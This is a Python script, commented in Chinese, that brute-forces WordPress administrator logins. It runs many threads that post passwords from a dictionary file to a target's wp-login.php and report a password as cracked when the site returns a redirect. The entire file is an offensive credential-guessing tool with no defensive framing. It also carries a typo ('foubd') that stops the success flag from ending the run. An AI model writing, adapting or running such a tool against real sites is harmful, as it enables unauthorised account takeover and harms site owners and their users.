import requests
import sys
import queue
import threading
import time
import getopt
urll=''
users=''
pss=''
threadss=''
class Mythread(threading.Thread):
    def __init__(self,url,user,passwd,threads):
        self.user=user
        self.found=False
        self.url=url
        self.threads =threads
        self.passwd=passwd
        print("+++++加载字典中++++++++")
        print(self.passwd)
        self.pass1=queue.Queue()
        file=open(self.passwd)
        for i in file.readlines():
            self.pass1.put(i.strip())
        self.result=None
        print("++++++++字典加载成功+++++++")
    def goit(self):
        for i in range(self.threads):
            t =threading.Thread(target=self.joinpwd)
            t.start()
            print('破解线程启动%s'%t.ident)
        while(not self.pass1.empty()):
            print("=======还剩%s个口令"%self.pass1.qsize())
            sys.stdout.flush()
            time.sleep(1)
            print('\n破解完毕')
            
    def __login(self,pwd):
        urls='{}/wp-login.php'.format(self.url)
        values = {'log': self.user, 'pwd': pwd, 'wp-submit': 'Log In',
                  'redirect_to': '{}/wp-admin'.format(self.url), 'test_cookie': '1'}
        my_cookie = {'wordpress_test_cookie': 'WP Cookie check'}
        r = requests.post(url=urls, data=values, cookies=my_cookie, allow_redirects=False) # 禁用重定向，以便后边判断登陆状态
        if r.status_code == 302: 
            return True
        return False
    def joinpwd(self):
        while not self.pass1.empty() and not self.found ==True:
            password=self.pass1.get()
            if self.__login(password)==True:
                self.foubd =True
                self.result =password
                print("破解%s 成功，密码为%s "%(self.user,password))
            else:
                self.found =False
if __name__=='__main__':
    try:
        opts, args= getopt.getopt(sys.argv[1:],"u:w:p:t:")
        for opt ,arg in opts:
            if opt in ("-u"):
                urll=arg
            elif opt in ("-w"):
                users=arg
            elif opt in ("-p"):
                pss=arg
                pss=str(pss)
            elif opt in ("-t"):
                threadss=arg
                threadss=int(threadss)
    except:
        print("获取参数时候报错 麻烦从新输入参数")
    if len(sys.argv[1:])!=8:
        print("用法")
        exit(0)
    b=Mythread(urll,users,pss,threadss)
    b.goit()
    print(b.result)
    
        
        
 
